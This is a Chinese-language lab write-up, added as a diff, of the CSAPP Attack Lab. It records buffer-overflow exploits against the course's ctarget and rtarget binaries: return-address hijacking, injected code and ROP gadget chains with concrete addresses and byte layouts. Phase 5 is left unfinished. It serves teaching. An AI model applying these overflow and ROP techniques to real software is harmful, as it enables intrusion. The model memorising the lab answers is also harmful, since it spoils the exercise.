@@ -1,0 +1,187 @@
+CSAPP Attack Lab 实验过程总结
+================================
+
+一、实验目标
+------------
+通过缓冲区溢出，理解 x86-64 栈帧约定、返回地址劫持、代码注入与
+面向返回编程（ROP）。目标程序：
+
+  - ctarget：栈可执行，完成 Phase 1–3（代码注入）
+  - rtarget：栈不可执行，完成 Phase 4–5（ROP）
+
+本实例 cookie：0x59b997fa
+
+
+二、环境说明
+------------
+1. 二进制为 Linux x86-64 ELF，macOS 上无法直接运行（exec format error）。
+2. 可用 Docker（./lab.sh shell）跑 Phase 1；但 Apple Silicon + Rosetta
+   下 GDB 无法读寄存器（Couldn't get registers: Input/output error）。
+3. Phase 2 起需要可靠的 %rsp：在 x86-64 ECS 上安装 gdb，并用
+     setarch x86_64 -R
+   关闭 ASLR，保证栈地址稳定。
+4. 通用流程：
+     ./hex2raw < phaseN.txt > phaseN.raw
+     setarch x86_64 -R ./ctarget|rtarget -q -i phaseN.raw
+
+
+三、底层共性：getbuf 与栈布局
+----------------------------
+getbuf 反汇编要点：
+
+  sub  $0x28, %rsp          ; 分配 0x28=40 字节缓冲区
+  mov  %rsp, %rdi
+  call Gets                 ; 无界读入，可溢出
+  add  $0x28, %rsp
+  ret                       ; 弹出返回地址
+
+溢出数据从 buf 低地址往高地址写。填满 40 字节后，接下来 8 字节
+覆盖返回地址。Gets 类似 gets，不检查长度——这是漏洞根源。
+
+
+四、Phase 1（ctarget）：只改返回地址
+------------------------------------
+目标：getbuf 返回时跳到 touch1，而不是回到 test。
+
+做法：
+  - 反汇编得到 touch1 @ 0x4017c0
+  - 40 字节填充 + 小端地址：c0 17 40 00 00 00 00 00
+
+原理：ret 把栈上的“返回地址”当作下一条要执行的指令地址。
+不注入新代码，只劫持控制流到已有函数。
+
+结果：Touch1! 通过。
+
+
+五、Phase 2（ctarget）：注入代码 + 准备参数
+------------------------------------------
+目标：调用 touch2(cookie)。touch2 用 %edi 与全局 cookie 比较。
+
+仅跳到 touch2 不够：此时 %rdi 不是 cookie。需要在栈上注入机器码：
+
+  movq $0x59b997fa, %rdi
+  pushq $0x4017ec          ; touch2
+  ret
+
+用 gcc -c / objdump -d 得到机器码，放在 buf 开头；返回地址改为
+buf 的运行时地址。
+
+在 ECS + setarch -R 下测得：
+  buf = %rsp @ getbuf+4 = 0x5561dc78
+
+布局：
+  [ 注入码 + 填充至 40 字节 ][ 返回地址 = 0x5561dc78 ]
+
+结果：Touch2!(0x59b997fa) 通过。
+
+要点：System V 调用约定——第 1 个整数参数在 %rdi/%edi。
+
+
+六、Phase 3（ctarget）：参数是字符串指针
+----------------------------------------
+目标：touch3(s)，s 指向 cookie 的十六进制字符串 "59b997fa"。
+touch3 调用 hexmatch(cookie, s) 做字符串匹配。
+
+与 Phase 2 的差别：%rdi 必须是指针，不是立即数。
+
+推荐布局（字符串放在返回地址之后）：
+  [ 注入码：rdi = buf+48; push touch3; ret ]
+  [ 填充到 40 字节 ]
+  [ 返回地址 = buf = 0x5561dc78 ]
+  [ "59b997fa" + '\0' ]          ; 地址 = 0x5561dca8
+
+字符串 ASCII：35 39 62 39 39 37 66 61 00
+touch3 @ 0x4018fa
+
+结果：Touch3!("59b997fa") 通过。
+ctarget 三个阶段全部完成。
+
+
+七、Phase 4（rtarget）：ROP 调用 touch2
+--------------------------------------
+rtarget 栈不可执行（NX），不能再在栈上跑注入码。
+改为使用程序里已有的短指令片段（gadget），用多次 ret 串起来。
+
+Phase 4 只用 start_farm ~ mid_farm 之间的字节。
+gadget 往往藏在立即数中间，不一定从函数入口开始执行。
+
+本实例用到的 gadget：
+  0x4019cc : 58 90 c3           pop %rax; nop; ret
+             （藏在 getval_280 的立即数里）
+  0x4019a2 : 48 89 c7 c3        mov %rax,%rdi; ret
+             （藏在 addval_273 的立即数里）
+  0x4017ec : touch2
+
+栈上链（40 字节填充之后）：
+  [ pop %rax 地址 ]
+  [ cookie 小端：fa 97 b9 59 00 00 00 00 ]  ; 被 pop 进 %rax
+  [ mov %rax,%rdi 地址 ]
+  [ touch2 地址 ]
+
+执行过程简述：
+  getbuf 的 ret → 跳到 pop %rax
+  pop 吃掉栈上 cookie → %rax = cookie
+  ret → mov %rax,%rdi → %rdi = cookie
+  ret → touch2
+
+结果：rtarget 上 Touch2! 通过。
+
+理解要点：
+  - ret / pop 都是“消耗当前栈顶 8 字节”
+  - ROP 链里交替放置：要跳的地址、要弹进寄存器的数据
+
+
+八、Phase 5（rtarget）：ROP 调用 touch3（进行中）
+------------------------------------------------
+目标：%rdi 指向栈上的 "59b997fa"，再进入 touch3。
+栈不可执行，且不宜写死绝对栈地址（ASLR），需用 gadget 计算指针。
+
+可用范围：mid_farm ~ end_farm，以及 add_xy。
+
+推荐思路：
+  1) mov %rsp,%rax; ret     已定位：0x401a06（addval_190 中 48 89 e0 c3）
+  2) mov %rax,%rdi; ret     复用 0x4019a2
+  3) pop %rsi; ret          待找（字节 5e c3 等）——装入“偏移”
+  4) add_xy @ 0x4019d6      rax = rdi + rsi = rsp + 偏移 ≈ 字符串地址
+  5) mov %rax,%rdi; ret
+  6) touch3 @ 0x4018fa
+
+偏移算法：在画出完整 ROP 链后，数清“执行 mov %rsp,%rax 时
+%rsp 所指位置”到“字符串存放位置”之间的字节距离。
+
+（本总结撰写时 Phase 5 尚未最终提交通过。）
+
+
+九、关键收获
+------------
+1. 栈向低地址增长，溢出字符串向高地址写，可覆盖返回地址。
+2. 小端序：地址/整数在 exploit 文件中按低字节在前书写。
+3. 调用约定决定攻击要改的不只是 PC（返回地址），还有参数寄存器。
+4. NX 迫使攻击从“注入代码”转向“复用已有代码”（ROP）。
+5. gadget 常通过对机器码字节的“错位解读”得到，入口未必是函数标号。
+6. ASLR 下绝对栈地址不稳定；setarch -R 便于实验复现，真实环境
+   更依赖相对 %rsp 的计算（Phase 5 的意义）。
+
+
+十、文件清单（本实验相关）
+--------------------------
+  phase1.txt / phase1.raw     Phase 1
+  phase2.txt / phase2.raw     Phase 2
+  phase3.txt / phase3.raw     Phase 3
+  phase4.txt / phase4.raw     Phase 4
+  inject.s / inject3.s        注入汇编源
+  ctarget.asm / rtarget.asm   反汇编
+  cookie.txt                  0x59b997fa
+  farm.c                      rtarget gadget farm 源码参考
+
+
+十一、调试建议（回顾）
+----------------------
+  gdb ./ctarget|rtarget
+  break *0x4017ac          ; getbuf 中 mov %rsp,%rdi 处，此时 %rsp==buf
+  run -q
+  print /x $rsp
+  x/20gx $rsp              ; 观察栈上 8 字节单元
+
+Segfault / illegal instruction 时：优先核对填充长度（是否恰为 40）、
+端序、以及返回地址/ROP 链是否指到可执行且正确的位置。
